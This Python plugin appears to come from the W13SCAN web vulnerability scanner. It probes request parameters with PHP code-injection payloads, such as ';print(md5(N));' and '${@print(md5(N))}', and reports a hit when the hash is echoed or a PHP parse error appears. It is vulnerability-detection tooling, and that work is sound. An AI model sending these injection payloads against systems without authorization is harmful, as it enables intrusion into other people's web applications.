#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/4 11:49 AM
# @Author  : w8ay
# @File    : command_php_code.py
import random
import re

from api import VulType
from lib.core.common import md5, generateResponse
from lib.core.data import conf
from lib.core.enums import WEB_PLATFORM
from lib.core.plugins import PluginBase
from lib.helper.helper_sensitive import sensitive_page_error_message_check


class W13SCAN(PluginBase):
    name = 'PHP代码注入'
    desc = '''PHP代码注入发现，可执行任意php代码'''

    def audit(self):
        if WEB_PLATFORM.PHP not in self.response.programing and conf.level < 2:
            return

        regx = 'Parse error: syntax error,.*?\sin\s'
        randint = random.randint(5120, 10240)
        verify_result = md5(str(randint).encode())
        _payloads = [
            "print(md5({}));",
            ";print(md5({}));",
            "';print(md5({}));$a='",
            "\";print(md5({}));$a=\"",
            "${{@print(md5({}))}}",
            "${{@print(md5({}))}}\\",
            "'.print(md5({})).'"
        ]
        # 载入处理位置以及原始payload
        iterdatas = self.generateItemdatas()

        errors = None
        errors_raw = ()
        # 根据原始payload和位置组合新的payload
        for origin_dict, positon in iterdatas:
            payloads = self.paramsCombination(origin_dict, positon, _payloads)
            for key, value, new_value, payload in payloads:
                r = self.req(positon, payload)
                if not r:
                    continue
                html1 = r.text
                if verify_result in html1:
                    result = self.new_result()
                    result.init_info(self.requests.url, self.desc, VulType.CMD_INNJECTION)
                    result.add_detail("payload探测", r.reqinfo, generateResponse(r),
                                      "探测payload:{}并发现回显:{}".format(new_value, verify_result), key, value, positon)
                    self.success(result)
                    break
                if re.search(regx, html1, re.I | re.S | re.M):
                    result = self.new_result()
                    result.init_info(self.requests.url, self.desc, VulType.CMD_INNJECTION)
                    result.add_detail("payload探测", r.reqinfo, generateResponse(r),
                                      "探测payload:{}并发现正则回显:{},可能是payload未闭合语句造成的错误".format(new_value, regx), key,
                                      value, positon)
                    self.success(result)
                    break
                if not errors:
                    errors = sensitive_page_error_message_check(html1)
                    if errors:
                        errors_raw = (key, value)

            if errors:
                result = self.new_result()
                key, value = errors_raw
                result.init_info(self.requests.url, "敏感配置信息泄漏", VulType.SENSITIVE)
                for m in errors:
                    text = m["text"]
                    _type = m["type"]
                    result.add_detail("payload请求", r.reqinfo, generateResponse(r),
                                      "匹配组件:{} 匹配正则:{}".format(_type, text), key, value, positon)
                self.success(result)
